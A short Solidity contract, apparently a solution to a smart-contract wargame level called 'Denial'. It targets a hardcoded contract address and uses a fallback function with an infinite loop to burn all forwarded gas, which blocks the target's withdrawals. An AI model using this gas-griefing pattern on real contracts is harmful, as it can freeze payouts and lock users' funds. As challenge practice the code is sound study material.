// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./hadcoins.sol";

contract Test {
    Denial public dn;

    constructor() public {
        dn = Denial(0xf97545fAbf11c1838c18422d113d3520a96825c7);
    }

    function withdraw() public {
        dn.withdraw();
    }

    function addFunds() public payable {}

    fallback() external payable {
        while (true) {}
    }
}
